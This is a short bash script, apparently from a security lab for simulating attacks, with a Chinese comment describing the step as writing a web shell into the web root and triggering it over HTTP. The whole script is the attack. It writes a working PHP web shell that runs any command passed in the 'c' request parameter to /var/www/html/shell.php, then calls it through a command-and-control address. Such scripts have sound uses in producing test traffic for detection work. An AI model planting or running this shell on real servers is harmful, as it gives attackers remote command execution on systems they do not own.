#!/usr/bin/env bash
# attack（窗口内）：web 根写入 web shell 并经 HTTP 触发执行。
set -euo pipefail
C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
cat > /var/www/html/shell.php <<'EOS'
<?php if (isset($_REQUEST["c"])) { echo shell_exec($_REQUEST["c"]); } ?>
EOS
curl -sf "http://$C2_IP:18080/shell.php?c=id" >/dev/null || true
